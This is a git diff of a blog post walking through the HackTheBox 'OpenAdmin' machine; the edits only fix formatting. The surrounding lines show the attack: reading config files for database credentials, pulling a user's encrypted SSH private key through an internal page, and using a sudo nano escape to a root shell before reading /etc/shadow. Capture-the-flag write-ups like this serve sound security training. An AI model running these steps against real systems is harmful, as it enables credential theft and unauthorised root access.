@@ -1,6 +1,6 @@
 ---
 layout: post
-title: HackTheBox  - OpenAdmin
+title: HackTheBox - OpenAdmin
 ---
 
 ## Enumeration
@@ -191,7 +191,7 @@ We don't have permission to ```cd``` into the config directory, but we can see w
 ```bash
 $ cat config/config.inc.php 
 ```
-```PHP
+```php
 <?php
 
 ///////////////////////   WARNING   /////////////////////////////
@@ -445,7 +445,7 @@ else {
 ```
 This part of the above file looks interesting, maybe some database credentials?
 
-```PHP
+```php
 // Include the basic database functions
 require_once($conf['inc_functions_db']);
 
@@ -459,7 +459,7 @@ With ```{$base}``` being ```/opt/ona/www```:
 $ cat /opt/ona/www/local/config/database_settings.inc.php
 ```
 
-```PHP
+```php
 <?php
 
 $ona_contexts=array (
@@ -503,20 +503,20 @@ jimmy@openadmin:/var/www$ cd ona
 ```
 In ```/var/www/internal```, we see an index.php file that checks if a POSTed username is jimmy and then uses a sha512 hash against the input password to see if it matches against a stored hash.
 
-```PHP
+```php
 if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
 ```
 
 Just in case, I decided to run the PHP and it turns out ```n1nj4W4rri0R!``` does not match the hash.
 
-```PHP
-php -r 'echo hash("sha512", "n1nj4W4rri0R!");'
+```bash
+$ php -r 'echo hash("sha512", "n1nj4W4rri0R!");'
 f0bb26b5b49e3314acc8a2ce6d0a62357a090790b4aed5b592a142746b144dbb92960cfbdbb4386928c6633f672b455120cbf939134f34d02ecea63ee4630344
 ```
 
 Well, good on jimmy for not using the same password. Before we start trying to crack the web login with hydra, let's look around some more.
 
-```
+```shell
 jimmy@openadmin:/var/www/internal$ cat main.php 
 <?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
 # Open Admin Trusted
@@ -532,7 +532,7 @@ Click here to logout <a href="logout.php" tite = "Logout">Session
 
 Let's see if we can access joanna's id_rsa file by curling the page on the live site.
 
-```
+```shell
 jimmy@openadmin:~$ curl http://localhost/main.php
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
@@ -607,7 +607,7 @@ Click here to logout <a href="logout.php" tite = "Logout">Session
 
 Watch out joanna!
 
-```bash
+```shell
 root@kali:~/HackTheBox/OpenAdmin$ echo "-----BEGIN RSA PRIVATE KEY-----
 > Proc-Type: 4,ENCRYPTED
 > DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
@@ -709,7 +709,7 @@ We can run the command ```/bin/nano /opt/priv``` but the file is unwriteable unl
 joanna@openadmin:~$ sudo /bin/nano /opt/priv
 ```
 
-Now with a privileged nano, we can break out into a root shell. Inside nano, use ```^R^X``` to get to the command execution menu. Then execute ```reset; sh 1>&0 2>&0``` ([REF](https://gtfobins.github.io/gtfobins/nano/). Run ```clear``` and you'll be able to see your shell. I check ```/etc/shadow``` to test my privileges.
+Now with a privileged nano, we can break out into a root shell. Inside nano, use ```^R^X``` to get to the command execution menu. Then execute ```reset; sh 1>&0 2>&0``` ([REF](https://gtfobins.github.io/gtfobins/nano/)). Run ```clear``` and you'll be able to see your shell. I check ```/etc/shadow``` to test my privileges.
 
 ```
 # cat /etc/shadow
